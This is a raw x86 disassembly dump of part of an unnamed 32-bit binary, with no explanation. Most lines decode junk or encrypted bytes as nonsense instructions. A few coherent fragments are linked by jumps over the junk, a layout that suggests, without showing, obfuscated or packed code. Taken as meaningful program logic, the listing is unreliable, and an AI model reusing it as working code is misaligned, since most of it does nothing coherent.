  40213e:	push   esi
  40213f:	std    
  402140:	fwait
  402141:	ja     0x402121
  402143:	sahf   
  402144:	xchg   ebp,eax
  402145:	scas   eax,DWORD PTR es:[edi]
  402146:	push   ss
  402147:	out    0x4e,al
  402149:	ss (bad) 
  40214b:	jbe    0x4021b8
  40214d:	mov    dh,0x1f
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	leave  
  40216a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40216b:	test   al,0x64
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x40211a
  402176:	js     0x402165
  402178:	sbb    DWORD PTR [eax],eax
  40217a:	push   edi
  40217b:	call   0x762fdea1
  402180:	stc    
  402181:	jle    0x4021f2
  402183:	mov    al,0x65
  402185:	xor    DWORD PTR [edx],0x3b
  402188:	sbb    DWORD PTR [edi+0x50],edx
  40218b:	neg    edx
  40218d:	inc    edx
  40218e:	push   ebx
  40218f:	xlat   BYTE PTR ds:[ebx]
  402190:	pop    esi
  402191:	test   DWORD PTR [ebx+ebp*2+0x40350738],esi
  402198:	cmc    
  402199:	aad    0x10
  40219b:	adc    ah,BYTE PTR [edx+0x6b98fab2]
  4021a1:	xchg   ecx,eax
  4021a2:	test   al,0xd4
  4021a4:	gs mov edi,0xd6e51cda
  4021aa:	push   esp
  4021ab:	bound  edi,QWORD PTR [ecx+eiz*2-0x25]
  4021af:	mov    esi,0x1ad56d5a
  4021b4:	out    0xaa,al
  4021b6:	jle    0x4021c0
  4021b8:	sbb    al,0xd8
  4021ba:	cmp    ecx,ebx
  4021bc:	jb     0x40217a
  4021be:	jae    0x40222c
  4021c0:	mov    cl,0xe2
  4021c2:	xchg   esi,eax
  4021c3:	mov    ah,0x9c
  4021c5:	jnp    0x402204
  4021c7:	fistp  QWORD PTR [ebp-0x5d]
  4021ca:	aaa    
  4021cb:	and    al,0x48
  4021cd:	push   eax
  4021ce:	jp     0x40216c
  4021d0:	ins    DWORD PTR es:[edi],dx
  4021d1:	les    edx,FWORD PTR [ebx-0x12]
  4021d4:	sbb    ecx,DWORD PTR [edi]
  4021d6:	and    eax,DWORD PTR [edx-0xa]
  4021d9:	hlt    
  4021da:	pop    ds
  4021db:	cmp    BYTE PTR [edi+ecx*4-0x6fdd9f12],al
  4021e2:	retf   0x82c4
  4021e5:	jae    0x40216c
  4021e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021e8:	xlat   BYTE PTR ds:[ebx]
  4021e9:	sysret 
  4021eb:	aam    0xa1
  4021ed:	and    cl,dh
  4021ef:	rcl    BYTE PTR [edi+0x65],0x50
  4021f3:	aad    0x9f
  4021f5:	mov    ebx,0x5278d9f8
  4021fa:	or     bl,BYTE PTR ds:0x6929c370
  402200:	mov    ch,0xc5
  402202:	sub    ah,0x2f
  402205:	push   cs
  402206:	xor    ebp,DWORD PTR [ebx+0x256a828c]
  40220c:	into   
  40220d:	pop    es
  40220e:	scas   al,BYTE PTR es:[edi]
  40220f:	dec    ecx
  402210:	jl     0x402226
  402212:	xchg   edx,eax
  402213:	cmp    BYTE PTR [esi+0x0],dh
  402216:	fisubr DWORD PTR [edx+eiz*1]
  402219:	mov    ch,0x46
  40221b:	test   ch,ah
  40221d:	sbb    ebp,eax
  40221f:	sar    DWORD PTR ds:0x1f5c9f44,1
  402225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402226:	aas    
  402227:	inc    ebx
  402228:	push   ebp
  402229:	sbb    edi,DWORD PTR [esi-0x6]
  40222c:	adc    al,0x7b
  40222e:	mov    ds:0xb0ca7ae9,al
  402233:	sbb    eax,DWORD PTR [eax+0xdee8f99]
  402239:	pop    ecx
  40223a:	lds    edx,FWORD PTR [ebx+0x31]
  40223d:	dec    edi
  40223e:	sub    BYTE PTR [edi-0x20],dh
  402241:	ins    DWORD PTR es:[edi],dx
  402242:	add    BYTE PTR [ebp+edx*2+0x6f],ah
  402246:	in     eax,dx
  402247:	call   0x85c2a8ce
  40224c:	xor    esi,esp
  40224e:	mov    cl,0xce
  402250:	aas    
  402251:	xchg   ecx,eax
  402252:	inc    ebp
  402253:	ret    0xf600
  402256:	xchg   esp,eax
  402257:	inc    esi
  402258:	in     al,dx
  402259:	adc    DWORD PTR [edx],eax
  40225b:	aas    
  40225c:	adc    edi,DWORD PTR [esi+0x380305c1]
  402262:	fwait
  402263:	call   0xb0309c42
  402268:	dec    esp
  402269:	sub    eax,0xa75f9455
  40226e:	rcr    edi,1
  402270:	clc    
  402271:	mov    WORD PTR [ebp+0x657ef2c8],gs
  402277:	mov    ebp,0xcad4c597
  40227c:	fwait
  40227d:	pop    ss
  40227e:	mov    ch,0xf3
  402280:	jle    0x402283
  402282:	lods   eax,DWORD PTR ds:[esi]
  402283:	hlt    
  402284:	pop    ds
  402285:	lock fistp DWORD PTR [esi]
  402288:	or     edx,esp
  40228a:	xor    ah,BYTE PTR [ecx-0x2ff78d5b]
  402290:	loop   0x4022eb
  402292:	pop    ss
  402293:	mov    ds:0x4e9484c0,eax
  402298:	mov    edx,0xb538a1c5
  40229d:	jp     0x402233
  40229f:	push   eax
  4022a0:	pop    eax
  4022a1:	shr    DWORD PTR [ebx+0x10bd5f0a],1
  4022a7:	dec    eax
  4022a8:	out    dx,eax
  4022a9:	mov    ch,0x58
  4022ab:	push   esp
  4022ac:	into   
  4022ad:	add    eax,0x15611fd
  4022b2:	xchg   ebx,eax
  4022b3:	or     BYTE PTR ds:[ecx-0x4036cb9e],bl
  4022ba:	repz cdq 
  4022bc:	sub    al,0xdc
  4022be:	in     eax,0xc7
  4022c0:	stos   DWORD PTR es:[edi],eax
  4022c1:	push   esp
  4022c2:	mov    ah,0xa6
  4022c4:	dec    esp
  4022c5:	adc    ch,BYTE PTR ss:[ebx-0x1f]
  4022c9:	fstp   st(3)
  4022cb:	inc    eax
  4022cc:	add    al,0x7
  4022ce:	lds    ebp,FWORD PTR [ebx+0x6]
  4022d1:	pop    ebx
  4022d2:	loop   0x4022ab
  4022d4:	in     al,0x98
  4022d6:	enter  0xca48,0x42
  4022da:	inc    edi
  4022db:	aad    0x5a
  4022dd:	pop    edi
  4022de:	ret    
  4022df:	sbb    BYTE PTR [ebx+0x53557eac],ah
  4022e5:	and    DWORD PTR [ebx+ebp*2-0x7f],esi
  4022e9:	or     DWORD PTR [edx],edx
  4022eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022ec:	fucomi st,st(4)
  4022ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022ef:	pop    ebp
  4022f0:	lods   al,BYTE PTR ds:[esi]
  4022f1:	cli    
  4022f2:	xchg   bh,cl
  4022f4:	enter  0x1140,0x4b
  4022f8:	inc    ebx
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	xchg   edi,eax
  402358:	cmp    edx,DWORD PTR [esi+0x7e039a2a]
  40235e:	jle    0x40235a
  402360:	jg     0x4023e0
  402362:	jle    0x402323
  402364:	and    esi,DWORD PTR [eax]
  402366:	sbb    al,0x16
  402368:	sbb    edi,DWORD PTR [edi-0x75]
  40236b:	shl    DWORD PTR [esi],cl
  40236d:	or     DWORD PTR [eax],ebp
  40236f:	mov    al,0xdf
  402371:	call   0x4db008e6
  402376:	enter  0x51e0,0xc2
  40237a:	dec    esp
  40237b:	rcl    DWORD PTR [ebx],cl
  40237d:	adc    ch,ch
  40237f:	sbb    DWORD PTR [ebp+0x6],edx
  402382:	sub    ah,BYTE PTR [ecx+0x0]
  402385:	cmp    ch,cl
  402387:	inc    ebx
  402388:	in     eax,dx
  402389:	popa   
  40238a:	xor    al,0xfc
  40238c:	inc    esp
  40238d:	clc    
  40238e:	pop    ecx
  40238f:	out    dx,eax
  402390:	push   0x19a643d0
  402395:	add    al,BYTE PTR [ebx]
  402397:	imul   BYTE PTR [eax-0x45349514]
  40239d:	out    0x80,al
  40239f:	lea    esi,[ecx+0x5425f82c]
  4023a5:	adc    esi,eax
  4023a7:	jecxz  0x40239b
  4023a9:	dec    edi
  4023aa:	adc    eax,0x79e8602d
  4023af:	repz shl ax,0x3
  4023b4:	hlt    
  4023b5:	and    al,0x4f
  4023b7:	jne    0x402400
  4023b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ba:	int    0x58
  4023bc:	push   ebx
  4023bd:	jl     0x402426
  4023bf:	daa    
  4023c0:	rcl    bh,0x1e
  4023c3:	inc    edi
  4023c4:	adc    eax,0x18fe3c9b
  4023c9:	mov    DWORD PTR [edi+0x7d913085],edi
  4023cf:	inc    esi
  4023d0:	sub    BYTE PTR [ebp+0x63],dh
  4023d3:	loopne 0x402394
  4023d5:	in     al,0xd6
  4023d7:	stos   BYTE PTR es:[edi],al
  4023d8:	add    eax,0x3e2ff035
  4023dd:	cmp    al,0xdb
  4023df:	arpl   WORD PTR [edi+0x3d713776],di
  4023e5:	cmp    al,0xe0
  4023e7:	xlat   BYTE PTR ds:[ebx]
  4023e8:	pushf  
  4023e9:	outs   dx,BYTE PTR ds:[esi]
  4023ea:	or     eax,0x95f797fd
  4023ef:	jae    0x402401
  4023f1:	retf   
  4023f2:	mov    DWORD PTR [esi-0x7c],ebx
  4023f5:	call   0x1e2:0x194ca5eb
  4023fc:	pop    edx
  4023fd:	push   ebp
  4023fe:	xlat   BYTE PTR ds:[ebx]
  4023ff:	loop   0x4023b1
  402401:	les    ebp,FWORD PTR [ebp+0x750160cd]
  402407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402408:	jle    0x402439
  40240a:	add    eax,0x23dad4cd
  40240f:	jge    0x402413
  402411:	in     al,0xa8
  402413:	sub    esi,DWORD PTR [ebx+edx*1-0x186d6a94]
  40241a:	cmp    al,0x90
  40241c:	daa    
  40241d:	mov    dh,0x37
  40241f:	daa    
  402420:	fwait
  402421:	and    BYTE PTR [ecx],0xc
  402424:	pop    ebx
  402425:	imul   edi,DWORD PTR fs:[ecx+ebx*4-0x19d7de5a],0xffffff97
  40242e:	mov    ch,0x77
  402430:	pop    ecx
  402431:	pop    esi
  402432:	int3   
  402433:	xchg   ebp,eax
  402434:	mov    fs,WORD PTR [edi+0x18]
  402437:	inc    edx
  402438:	mov    al,0x78
  40243a:	xchg   ecx,eax
  40243b:	xor    DWORD PTR ss:[edx+0x5b],edx
  40243f:	clc    
  402440:	adc    DWORD PTR [edi],ecx
  402442:	lds    ebx,FWORD PTR [esi-0x7fa9abaf]
  402448:	dec    eax
  402449:	mov    al,ds:0xd9e7d116
  40244e:	jp     0x4024ab
  402450:	push   esp
  402451:	pop    eax
  402452:	das    
  402453:	loopne 0x402434
  402455:	push   esp
  402456:	mov    BYTE PTR [esi+0x30f8a352],ah
  40245c:	sub    al,0x3
  40245e:	cmp    edi,DWORD PTR [ecx+0x19]
  402461:	shr    BYTE PTR [bp+di+0x4c],1
  402465:	xlat   BYTE PTR ds:[ebx]
  402466:	and    esp,DWORD PTR [esi+0x2d93bfa3]
  40246c:	and    eax,0xb3fdc22
  402471:	(bad)  
  402472:	push   0x48
  402474:	sub    DWORD PTR [ecx+0x2a0d262e],ebp
  40247a:	push   cs
  40247b:	and    eax,DWORD PTR [ebx-0x54e95391]
  402481:	adc    dl,0xfd
  402484:	inc    eax
  402485:	out    dx,al
  402486:	pusha  
  402487:	dec    esp
  402488:	popa   
  402489:	push   es
  40248a:	shr    DWORD PTR [ecx-0x279e0142],cl
  402490:	sbb    al,0x25
  402492:	xor    BYTE PTR [ebx+0x44],bl
  402495:	mov    bh,0xf9
  402497:	xlat   BYTE PTR ds:[ebx]
  402498:	mov    ebx,0xa3716992
  40249d:	mov    esp,0xa16c05bc
  4024a2:	dec    esi
  4024a3:	sub    ecx,ecx
  4024a5:	and    esi,DWORD PTR [eax]
  4024a7:	fldenv [edx-0x1f3f4589]
  4024ad:	in     al,0x8b
  4024af:	arpl   WORD PTR [ebp+edi*2+0x754fc657],cx
  4024b6:	push   es
  4024b7:	mov    ecx,0xe4976f14
  4024bc:	aaa    
  4024bd:	cmp    BYTE PTR [esi+eiz*1+0x1d],al
  4024c1:	adc    ah,ah
  4024c3:	pop    ds
  4024c4:	mov    ebp,0x63498e36
  4024c9:	daa    
  4024ca:	lods   al,BYTE PTR ds:[esi]
  4024cb:	in     eax,dx
  4024cc:	mov    esi,0xceb4be0b
  4024d1:	dec    ebx
  4024d2:	rcr    DWORD PTR [edi],cl
  4024d4:	push   esi
  4024d5:	cwde   
  4024d6:	jmp    0x40247c
  4024d8:	push   eax
  4024d9:	retf   0xfda7
  4024dc:	mov    cl,0xfd
  4024de:	mov    edi,0x9538e32
  4024e3:	arpl   WORD PTR [edx+0x458bf5dc],sp
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	adc    edx,ecx
  40250f:	mul    DWORD PTR [esi+eiz*1+0x1]
  402513:	jle    0x402593
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x4024d1
  40251a:	pop    eax
  40251b:	push   ebp
  40251c:	rol    DWORD PTR [ebx+0xd671153],0x89
  402523:	cwde   
  402524:	in     al,0x16
  402526:	test   al,0xdd
  402528:	ror    DWORD PTR [eax-0x6e],0xcc
  40252c:	mov    esi,0x283862bc
  402531:	jecxz  0x4024f0
  402533:	cwde   
  402534:	jns    0x40255c
  402536:	mov    bh,0x87
  402538:	jbe    0x4025ad
  40253a:	add    DWORD PTR [esi+0x37],esi
  40253d:	mov    ecx,0x2fec2917
  402542:	(bad)  
  402543:	arpl   WORD PTR [esp+edi*2-0x2],dx
  402547:	imul   ebp,DWORD PTR [edx],0xce08820e
  40254d:	bound  edx,QWORD PTR [edx]
  40254f:	sahf   
  402550:	mov    bl,0x5d
  402552:	popa   
  402553:	mov    ch,0x2
  402555:	mov    edi,0x432e8016
  40255a:	in     eax,0x3
  40255c:	push   ds
  40255d:	pop    ebp
  40255e:	aad    0x30
  402560:	pop    ebp
  402561:	cmp    BYTE PTR [edx+0x2b567cf1],ah
  402567:	mov    ch,0x41
  402569:	mov    ebx,0xed00753a
  40256e:	repz xchg edi,eax
  402570:	inc    eax
  402571:	lock xor BYTE PTR [edi-0x514c7b96],cl
  402578:	jmp    0x884d1e54
  40257d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40257e:	out    0xb4,eax
  402580:	aam    0xb6
  402582:	out    0xaf,eax
  402584:	sbb    al,0xda
  402586:	sbb    ah,BYTE PTR [eax-0x58]
  402589:	imul   ebp,DWORD PTR [ebx+ebx*2-0x4ee7660d],0xffffffdd
  402591:	push   0x6e
  402593:	mov    esp,0xa80537e6
  402598:	sti    
  402599:	cld    
  40259a:	mov    edi,0x3c21d893
  40259f:	das    
  4025a0:	xchg   ecx,eax
  4025a1:	push   0x63435407
  4025a6:	dec    edi
  4025a7:	or     al,dh
  4025a9:	jae    0x40253d
  4025ab:	push   esi
  4025ac:	rol    BYTE PTR [bp+di],1
  4025af:	int3   
  4025b0:	fld    st(3)
  4025b2:	jbe    0x402565
  4025b4:	pop    ebx
  4025b5:	in     al,dx
  4025b6:	jbe    0x4025e1
  4025b8:	cld    
  4025b9:	ror    dh,0x45
  4025bc:	shr    DWORD PTR [ebx+eax*8-0x33],cl
  4025c0:	mov    ebp,0xe14af297
  4025c5:	or     al,0x3b
  4025c7:	arpl   WORD PTR [edx],bx
  4025c9:	sub    DWORD PTR [ebx-0x2b],esi
  4025cc:	and    BYTE PTR [ebp-0x74],al
  4025cf:	mov    BYTE PTR [esi+eax*2],ah
  4025d2:	std    
  4025d3:	mov    cl,0xa1
  4025d5:	dec    edi
  4025d6:	bound  ecx,QWORD PTR [esi-0x47258974]
  4025dc:	lods   eax,DWORD PTR ds:[esi]
  4025dd:	mov    bl,0xc4
  4025df:	inc    eax
  4025e0:	xchg   ebx,eax
  4025e1:	sub    dl,ah
  4025e3:	(bad)  
  4025e5:	inc    eax
  4025e6:	sub    ebp,DWORD PTR [esi-0x16]
  4025e9:	ins    BYTE PTR es:[edi],dx
  4025ea:	adc    ah,0x73
  4025ed:	ss or  dl,al
  4025f0:	mov    esp,0x7619d6b7
  4025f5:	xchg   edx,eax
  4025f6:	jnp    0x40259e
  4025f8:	clc    
  4025f9:	dec    DWORD PTR [ebx]
  4025fb:	mov    edi,DWORD PTR [esi+0x1277969c]
  402601:	pushf  
  402602:	pop    edx
  402603:	cmp    BYTE PTR [edx],bh
  402605:	adc    eax,edi
  402607:	call   FWORD PTR [ecx]
  402609:	call   0x89d894ab
  40260e:	mov    dh,0x1e
  402610:	sbb    eax,0xd1f61915
  402615:	and    dh,ch
  402617:	in     al,dx
  402618:	pop    esi
  402619:	push   eax
  40261a:	dec    ebx
  40261b:	adc    al,0x41
  40261d:	add    al,0x53
  40261f:	pop    ss
  402620:	mov    dh,0x15
  402622:	hlt    
  402623:	neg    BYTE PTR [esi]
  402625:	dec    ecx
  402626:	add    ecx,ebx
  402628:	dec    ecx
  402629:	inc    eax
  40262a:	out    0xd5,al
  40262c:	xchg   edx,eax
  40262d:	hlt    
  40262e:	pop    es
  40262f:	lock pushf 
  402631:	inc    ebx
  402632:	imul   edx,DWORD PTR [esi+0x79140c63],0xfffffff3
  402639:	cmp    al,0x65
  40263b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40263c:	mov    ch,0x30
  40263e:	pop    edx
  40263f:	lea    ebx,[ebp-0x7e]
  402642:	rcl    DWORD PTR [ebp+0x46],cl
  402645:	(bad)  
  402647:	ror    DWORD PTR [ecx-0x2f29f7f3],cl
  40264d:	inc    edi
  40264e:	jo     0x4025e1
  402650:	and    DWORD PTR [ebx+0x62],ebp
  402653:	jno    0x402633
  402655:	imul   eax,DWORD PTR [edx+0x1e],0x37
  402659:	leave  
  40265a:	icebp  
  40265b:	or     dl,BYTE PTR [ecx-0x79]
  40265e:	or     al,0xc0
  402660:	js     0x40268c
  402662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402663:	jmp    0x40268d
  402665:	shl    BYTE PTR [eax+eiz*1],0xeb
  402669:	cmp    eax,0x5fbf504
  40266e:	push   esp
  40266f:	dec    edi
  402670:	cmp    ecx,DWORD PTR [ecx+ebx*8+0x9ce596b]
  402677:	inc    edx
  402678:	mov    bl,BYTE PTR [edx-0x7d]
  40267b:	mov    al,ds:0xd5bedafb
  402680:	in     eax,dx
  402681:	jns    0x402608
  402683:	in     al,0x5d
  402685:	xchg   edi,eax
  402686:	dec    esi
  402687:	ret    
  402688:	dec    esi
  402689:	ror    esp,cl
  40268b:	paddd  mm1,QWORD PTR [eax]
  40268e:	bound  esp,QWORD PTR [ebx]
  402690:	mov    ds:0x16dad486,al
  402695:	(bad)  
  402696:	and    bl,dl
  402698:	sub    bl,cl
  40269a:	std    
  40269b:	or     eax,esi
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	pop    ebp
  4026d3:	push   edi
  4026d4:	aas    
  4026d5:	inc    ecx
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026cb
  4026df:	fs retf 0xfd87
  4026e3:	xlat   BYTE PTR gs:[ebx]
  4026e5:	sahf   
  4026e6:	mov    ch,BYTE PTR [ebx]
  4026e8:	xor    al,0xc4
  4026ea:	sub    DWORD PTR [esi],edi
  4026ec:	ret    0x47cb
  4026ef:	in     eax,0xb9
  4026f1:	pop    ecx
  4026f2:	and    esi,esi
  4026f4:	aam    0xde
  4026f6:	push   es
  4026f7:	pop    eax
  4026f8:	(bad)  
  4026f9:	push   ds
  4026fa:	adc    dl,BYTE PTR [edx-0x27]
  4026fd:	dec    esi
  4026fe:	test   al,0xa
  402700:	inc    eax
  402701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402702:	retf   
  402703:	cwde   
  402704:	jp     0x4026f1
  402706:	sub    BYTE PTR [edi-0x67],bl
  402709:	jnp    0x402698
  40270b:	call   0x8c74:0xd7c5f469
  402712:	das    
  402713:	xlat   BYTE PTR gs:[ebx]
  402715:	jp     0x4026ab
  402717:	sahf   
  402718:	std    
  402719:	adc    eax,0x4f3ff72c
  40271e:	adc    BYTE PTR [edi+ebx*1+0x57],ch
  402722:	aas    
  402723:	dec    esi
  402724:	retf   
  402725:	mov    eax,0x9d93480d
  40272a:	dec    esi
  40272b:	outs   dx,DWORD PTR ds:[esi]
  40272c:	(bad)  
  40272d:	outs   dx,DWORD PTR ds:[esi]
  40272e:	and    bh,BYTE PTR [edx]
  402730:	gs (bad) 
  402732:	out    dx,al
  402733:	xor    BYTE PTR [ebp-0x543286d2],0xb2
  40273a:	std    
  40273b:	shl    DWORD PTR [eax+0x22ef3749],1
  402741:	xor    al,ch
  402743:	sbb    al,0xc7
  402745:	sahf   
  402746:	dec    esi
  402747:	je     0x4026d3
  402749:	int    0x95
  40274b:	and    ebx,0x5f562a8c
  402751:	mov    edx,0x2bbf58cc
  402756:	aaa    
  402757:	lods   al,BYTE PTR ds:[esi]
  402758:	out    dx,eax
  402759:	mov    dh,0x50
  40275b:	shr    esi,1
  40275d:	div    bl
  40275f:	in     al,0xc8
  402761:	or     dh,ch
  402763:	pop    esi
  402764:	xchg   edi,eax
  402765:	cmp    eax,0x5293653a
  40276a:	das    
  40276b:	scas   eax,DWORD PTR es:[edi]
  40276c:	ss nop
  40276e:	inc    esp
  40276f:	nop
  402770:	outs   dx,BYTE PTR ds:[esi]
  402771:	jae    0x402734
  402773:	push   ebx
  402774:	imul   edx,DWORD PTR [edx],0xffffffea
  402777:	arpl   WORD PTR [edx+0x4aaadd88],bx
  40277d:	add    eax,0xf8d7286d
  402782:	push   es
  402783:	cmp    ah,BYTE PTR [edx+ebx*1]
  402786:	push   cs
  402787:	ficomp WORD PTR [edx+0x7aac292c]
  40278d:	push   ebp
  40278e:	jnp    0x4027fe
  402790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402791:	push   ss
  402792:	scas   al,BYTE PTR es:[edi]
  402793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402794:	hlt    
  402795:	xchg   esp,eax
  402796:	mov    edi,0x8e087757
  40279b:	mov    bl,0xb
  40279d:	pop    ss
  40279e:	in     eax,0xa9
  4027a0:	imul   eax,DWORD PTR [esi],0x6ef38a71
  4027a6:	or     BYTE PTR [ebp+0x3b],bl
  4027a9:	stc    
  4027aa:	stos   BYTE PTR es:[edi],al
  4027ab:	(bad)  
  4027ac:	daa    
  4027ad:	xchg   DWORD PTR [eax+0x4d],edx
  4027b0:	jl     0x4027f4
  4027b2:	arpl   WORD PTR [ebx],dx
  4027b4:	inc    eax
  4027b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027b6:	cld    
  4027b7:	fiadd  DWORD PTR [eax-0xcf138f0]
  4027bd:	mov    ebp,0xa49f2058
  4027c2:	or     al,0xe5
  4027c4:	(bad)  
  4027c5:	sbb    BYTE PTR [eax-0x7f],ah
  4027c8:	das    
  4027c9:	xor    DWORD PTR [ecx+0x2],ebx
  4027cc:	pop    ebx
  4027cd:	inc    ecx
  4027ce:	or     BYTE PTR [eax-0x1],dl
  4027d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027d2:	add    dh,BYTE PTR [eax-0x3ac2cdf9]
  4027d8:	retf   
  4027d9:	leave  
  4027da:	cdq    
  4027db:	jnp    0x40276d
  4027dd:	add    BYTE PTR [ebx+edx*2-0xbaee6fc],dh
  4027e4:	xor    BYTE PTR [ebx],0xc2
  4027e7:	and    al,0x8e
  4027e9:	inc    edi
  4027ea:	mov    cl,0xda
  4027ec:	shl    BYTE PTR [edx-0x39],cl
  4027ef:	dec    eax
  4027f0:	mov    ah,0x44
  4027f2:	sub    ebp,DWORD PTR [eax-0x65]
  4027f5:	xchg   ebp,eax
  4027f6:	cwde   
  4027f7:	call   0xc:0xc954be7f
  4027fe:	cli    
  4027ff:	xor    BYTE PTR [esi-0x45699bd4],bl
  402805:	adc    ebx,edx
  402807:	adc    al,0xde
  402809:	pop    edi
  40280a:	xlat   BYTE PTR ds:[ebx]
  40280b:	mov    al,0xd6
  40280d:	mov    ecx,0x8a1d1c31
  402812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402813:	mov    edx,0xc1f0dc51
  402818:	mov    ebp,0x4fda343e
  40281d:	mov    dx,0xe8fb
  402821:	push   ebx
  402822:	icebp  
  402823:	repz sbb BYTE PTR [edx-0x48],cl
  402827:	sbb    al,cl
  402829:	pop    es
  40282a:	sbb    edi,esi
  40282c:	or     esi,DWORD PTR [esi]
  40282e:	jno    0x4027be
  402830:	pop    edx
  402831:	clc    
  402832:	xlat   BYTE PTR ds:[ebx]
  402833:	and    al,0x1f
  402835:	rol    DWORD PTR [esi-0x79],cl
  402838:	(bad)  
  402839:	jnp    0x40286a
  40283b:	xchg   ebx,eax
  40283c:	xor    al,0x45
  40283e:	push   eax
  40283f:	jo     0x4028b1
  402841:	fwait
  402842:	pop    edx
  402843:	lods   eax,DWORD PTR ds:[esi]
  402844:	push   esi
  402845:	daa    
  402846:	push   es
  402847:	and    eax,0x8c1affce
  40284c:	dec    edx
  40284d:	fcmove st,st(6)
  40284f:	xchg   ebp,eax
  402850:	iret   
  402851:	js     0x40280f
  402853:	dec    eax
  402854:	or     DWORD PTR [ebp+0x4c],0x40dc0418
  40285b:	and    esi,DWORD PTR [ebp+0x6f]
  40285e:	cli    
  40285f:	sub    edi,ebp
  402861:	test   eax,0x8bd0458b
  402866:	dec    ebp
  402867:	clc    
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	fwait
  402884:	push   eax
  402885:	push   edi
  402886:	cld    
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402837
  402890:	jle    0x40283d
  402892:	xchg   esp,eax
  402893:	pop    ebx
  402894:	mov    ds:0xcfb1e305,eax
  402899:	jo     0x4028ae
  40289b:	leave  
  40289c:	ins    DWORD PTR es:[edi],dx
  40289d:	retf   0x38ce
  4028a0:	fwait
  4028a1:	scas   eax,DWORD PTR es:[edi]
  4028a2:	jmp    0xcdbb:0x3854b1e2
  4028a9:	mov    ds:0x86e3bd53,al
  4028ae:	jb     0x402906
  4028b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028b1:	clc    
  4028b2:	test   BYTE PTR [ebp+edx*8-0x31],cl
  4028b6:	test   BYTE PTR [edi+0x4],dl
  4028b9:	shr    DWORD PTR [ecx+0x61],cl
  4028bc:	pop    ds
